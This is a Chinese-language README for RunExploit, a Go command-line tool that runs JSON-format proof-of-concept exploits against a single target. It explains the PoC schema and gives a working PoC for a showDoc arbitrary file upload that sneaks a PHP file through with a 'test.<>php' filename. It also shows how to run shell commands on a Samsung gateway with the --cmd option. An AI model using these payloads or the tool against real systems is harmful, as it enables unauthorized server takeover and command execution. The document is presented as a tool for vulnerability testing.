### RunExploit

Golang语言编写的json格式poc利用工具，目前支持多种格式poc

该工具为命令行工具，加载json格式数据，用于检测单个目标是否存在漏洞，并利用

##### 程序目录结构：

```
config.json
RunExploit.exe
```

##### config.json

```
{  
	"Exploit":{      
		"Path": "./Exploits/",         
		"Logs": "./logs/errror.log"  
	}
}
```

```
Path: 用于日后存放json格式poc的目录，可任意指定
Logs: 错误和失败日志生成的.log后缀文本文件
```

##### poc脚本格式

```json
{
    "Name": "",   
    "Description": "",
    "Product": "",
    "author": "",
    "Request":{
        "Method": "GET",
        "Header": {},
        "Uri":"",
        "Data":"",
        "Upload":{
            "Name": "",
            "fileName": "",
            "filePath": ""
        }
    },
    "Response": {
        "Steps": "AND",
        "Checks": [
            {
                "Operation": "contains",
                "Value": ""
            },
            {
                "Operation": "code",
                "Value": "200"
            }
        ]
    },
    "Regexps": []
}
```

```
Name : 用于指定漏洞名称
Description: 漏洞信息描述
Product: 产品名称
author: 漏洞编辑人
Request:{
	Method: 请求方法，目前支持GET、POST两种方法
	Header: 设定请求头，键值对模式 {"User-Agent":"xxxxxxx","content-Type":"xxxxxxxx"}
	Uri: 文件路径，会自动拼接原始url，如http:127.0.0.1，则http://127.0.0.1/index.php
	Data: 执行的数据
	"Upload":{
            "Name": "",  文件上传表单字段名
            "fileName": "", 上传的文件名
            "filePath": ""  上传文件路径
        }
}
Response:{
   Steps: 判断方式，目前支持两种，AND 和 OR，AND 需要满足2个特征，才会返回成功，OR满足一个特征，返回成功
   Checks:[
       {
            Operation:"contains"  返回体包含Value值，则返回true
            Value: ""
       },
       {
            Operation:"code"  返回状态码满足Value值，则返回true
            Value: ""
       }
   ]
}
"Regexps":"" 正则匹配响应主体内容，并输出
其中Header，Uri，Data，如需执行命令，可采用 `(&)` 符号替换，会自动将该位置换为-cmd参数传入的字符串
```

程序分为6个参数，可采用-h或--help查看帮助

```
RunExploit --help
```

![image-20210427144927582](images\image-20210427144927582.png)

以showDoc 任意文件上传漏洞为例

```
{
    "Name": "showDoc 任意文件上传",
    "Description": "showDoc 任意文件上传,可达到服务器沦陷",
    "Product": "showDoc",
    "author": "",
    "Request":{
        "Method": "POST",
        "Header": {"User-Agent": " Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"},
        "Uri":"/index.php?s=/home/page/uploadImg",
        "Data":"",
        "Upload":{
            "Name": "editormd-image-file",
            "fileName": "test.<>php",
            "filePath": "../Upload/phpinfo.php"
        }
    },
    "Response": {
        "Steps": "AND",
        "Checks": [
            {
                "Operation": "contains",
                "Value": "success"
            },
            {
                "Operation": "code",
                "Value": "200"
            }
        ]
    },
    "Regexps": []
}
```

```
RunExploit.exe --find <name>
RunExploit.exe --find showdoc
```

![image-20210427145045821](images\image-20210427145045821.png)

```
加载json文件，并进行初始测试，返回返回包获取路径结果
RunExploit.exe -json <json file name> -url <target> --body
```

![image-20210427145612712](images\image-20210427145612712.png)

![image-20210427145802487](images\image-20210427145802487.png)

以三星网关任意代码执行，执行命令

```
RunExploit.exe -json <json file name> -url <target> --body --cmd ifconfig
```

![image-20210427150134930](images\image-20210427150134930.png)